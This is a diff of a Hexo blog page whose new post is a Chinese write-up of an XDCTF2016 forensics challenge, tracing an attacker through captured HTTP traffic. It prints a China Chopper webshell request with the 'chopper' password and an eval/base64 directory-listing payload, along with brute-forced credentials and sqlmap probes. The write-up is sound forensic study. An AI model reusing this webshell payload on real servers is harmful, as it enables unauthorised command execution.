@@ -6,19 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Hello World | Hexo</title>
+  <title>XDCTF2016_铁人三项_WP（HTTP数据包的快速分析） | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
-<meta name="keywords">
+  <meta name="description" content="分析题目如下  下载数据包（光下载就用了我两天。。比赛都结束了，也是醉醉的） 下载完毕后发现有多个数据包，使用wireshark自带的pcap数据包合并工具将多个pcap数据包合并成为一个数据包 sum.pcap">
+<meta name="keywords" content="web,writeup">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hello World">
-<meta property="og:url" content="http://yoursite.com/2017/04/27/hello-world/index.html">
+<meta property="og:title" content="XDCTF2016_铁人三项_WP（HTTP数据包的快速分析）">
+<meta property="og:url" content="http://yoursite.com/2016/10/05/xdctf2016-wp/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
-<meta property="og:updated_time" content="2017-04-28T06:46:31.235Z">
+<meta property="og:description" content="分析题目如下  下载数据包（光下载就用了我两天。。比赛都结束了，也是醉醉的） 下载完毕后发现有多个数据包，使用wireshark自带的pcap数据包合并工具将多个pcap数据包合并成为一个数据包 sum.pcap">
+<meta property="og:updated_time" content="2016-12-20T02:32:33.131Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Hello World">
-<meta name="twitter:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+<meta name="twitter:title" content="XDCTF2016_铁人三项_WP（HTTP数据包的快速分析）">
+<meta name="twitter:description" content="分析题目如下  下载数据包（光下载就用了我两天。。比赛都结束了，也是醉醉的） 下载完毕后发现有多个数据包，使用wireshark自带的pcap数据包合并工具将多个pcap数据包合并成为一个数据包 sum.pcap">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -136,33 +136,53 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-hello-world" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-xdctf2016-wp" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      Hello World
+      XDCTF2016_铁人三项_WP（HTTP数据包的快速分析）
     </h1>
   
 
-        <a href="/2017/04/27/hello-world/" class="archive-article-date">
-  	<time datetime="2017-04-28T06:46:31.235Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-04-27</time>
+        <a href="/2016/10/05/xdctf2016-wp/" class="archive-article-date">
+  	<time datetime="2016-10-05T07:33:21.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-10-05</time>
 </a>
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
+        <h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>题目如下</p>
+
+<p>下载数据包（光下载就用了我两天。。比赛都结束了，也是醉醉的）</p>
+<p>下载完毕后发现有多个数据包，使用wireshark自带的pcap数据包合并工具将多个pcap数据包合并成为一个数据包 sum.pcap<br></p>
+ <a id="more"></a>
+
+<p>使用wireshark打开分析，在文件-＞导出对象－＞HTTP 中发现敏感的登陆页面，并且多次出现，猜测应该是黑客爆破的登陆页面。<br></p>
+<p>接着使用过滤规则<code>http and ((ip.src == 219.239.105.18 and ip.dst == 172.16.61.210) or (ip.src == 172.16.61.210 and ip.dst == 219.239.105.18))</code>，仔细分析对应的HTTP攻击流量。</p>
+<p>然而wireshark还是太麻烦了。。。 做起来太耗时间，想着能否有一个工具可以提取出pcap数据包中对应的IP的HTTP协议数据包，把heard 和 body 都提出来。</p>
+<p>找了一下发现一个神器<a href="https://github.com/caoqianli/httpcap#usage" target="_blank" rel="external">https://github.com/caoqianli/httpcap#usage</a></p>
+<p>安装完毕后，使用其进行数据包分析，首先提取我们迫切需要的数据。</p>
+<p><code>parse-pcap -i 219.239.105.18 -vvv sum.pcap &gt; 1.html</code></p>
+<p>然后使用notepad++对其进行手工分析（数据量已经很少了。</p>
+<p>找到关键数据,用户名为root 密码为 123456  题一、题二已经解决。</p>
+
+<p>发现黑客进入后台后，修改的页面为index.html，题三解决</p>
+
+<p>如下图可以看到，黑客已经将一句话木马写入web服务器，且其口令为<code>chopper</code>，完整连接地址为<code>http://118.194.196.232/index.php?m=search</code>,题四、题五解决。通过查看返回包得知其执行的命令为pwd，查看当前目录绝对路径的命令。</p>
+
+<p>继续往下分析。发现其查看了目录文件，继而返回去分析其命令。</p>
+
+<p><code>chopper=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELiIvIi4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iCiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygifDwtIik7ZGllKCk7&amp;z1=L3Zhci93d3cvaHRtbC8%3D</code></p>
+<p>url解码</p>
+<p><code>chopper=@eval(base64_decode($_POST[z0]));&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELiIvIi4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iCiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygifDwtIik7ZGllKCk7&amp;z1=L3Zhci93d3cvaHRtbC8=</code></p>
+<p>z0为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(Ii0 |&quot;);;$D=base64_decode($_POST[&quot;z1&quot;]);$F=@opendir($D);if($F==NULL)&#123;echo(&quot;ERROR:// Path Not Found Or No Permission!&quot;);&#125;else&#123;$M=NULL;$L=NULL;while($N=@readdir($F))&#123;$P=$D.&quot;/&quot;.$N;$T=@date(&quot;Y-m-d H:i:s&quot;,@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R=&quot;\t&quot;.$T.&quot;\t&quot;.@filesize($P).&quot;\t&quot;.$E.&quot;</div><div class="line">&quot;;if(@is_dir($P))$M.=$N.&quot;/&quot;.$R;else $L.=$N.$R;&#125;echo $M.$L;@closedir($F);&#125;;echo(&quot;|&lt;-&quot;);die();</div></pre></td></tr></table></figure></p>
+<p>z1为<br><code>/var/www/html/</code></p>
+<p>可知其查看的第一个文件目录为<code>/var/www/html</code>，第六个问题解决。</p>
+<p>发现数据还没查看玩，继续拉下去分析。。。。竟然发现了sqlmap跑包的数据，特么一句话都有了，还搞sqlmap干啥？？？ - -。。。</p>
+<p>如下图，大量对<code>http://118.194.196.232:8090/webmail/userapply.php?execadd=111&amp;DomainID=111</code>的<code>Domain</code>参数进行sql注入尝试的http数据包。然而并没有什么软用<br></p>
 
       
 
@@ -192,6 +212,11 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags"></i>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/">writeup</a></li></ul>
+	</div>
+
       
 
       
@@ -242,7 +267,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="http://s.jiathis.com/qrcode.php?url=http://yoursite.com/2017/04/27/hello-world/" alt="微信分享二维码">
+      <img src="http://s.jiathis.com/qrcode.php?url=http://yoursite.com/2016/10/05/xdctf2016-wp/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -256,15 +281,20 @@
   
 <nav id="article-nav">
   
-    <a href="/2017/04/27/2017-429-final/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2016/07/19/C-S-WeChat/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          【pwn】2017-429final
+          C/S-WeChat
         
       </div>
     </a>
   
+  
+    <a href="/2017/03/17/FILE结构体的溢出利用【FSP】/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">FILE结构体的溢出利用【FSP】</div>
+      <i class="icon-circle-right"></i>
+    </a>
   
 </nav>
 
